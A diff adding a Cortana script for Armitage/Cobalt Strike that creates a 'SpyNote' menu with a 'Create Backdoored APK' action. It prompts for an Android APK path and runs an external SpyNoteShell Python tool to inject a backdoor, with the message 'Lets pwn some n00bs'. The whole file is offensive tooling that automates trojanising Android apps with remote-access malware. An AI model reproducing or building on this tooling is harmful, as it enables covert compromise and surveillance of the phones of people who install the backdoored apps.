@@ -1,0 +1,25 @@
+
+println("\n----------------------------------------\n[*]\c4 Cortana-SpyNoteShell Integration [*] \n----------------------------------------");
+println("----------------------------------------\n[*]\c4         By _R4v3n B1t3s          [*] \n----------------------------------------");
+ 
+menubar("SpyNote", "spynote",1);
+ 
+popup spynote {
+menu "SpyNoteShellV1" {
+item "Create Backdoored APK" {
+
+
+show_message("[*] Welcome to SpyNoteShell integration with Armitage/Cobalt Strike by _R4v3n [*]");
+$apkfile = prompt_text("Set your APK to backdoor with the PATH");
+show_message("You'll find your backdoored APK in same SpyNoteSHell's directory");
+if
+($apkfile !is $null) {
+show_message("Lets pwn some n00bs");
+   $console = open_console_tab("SpyNoteShell");
+   cmd($console, "cd /root/SpyNoteShellV1/")
+   cmd($console, "gnome-terminal -x python spynoteshell.py $apkfile");
+   db_sync()
+}
+}
+}
+}
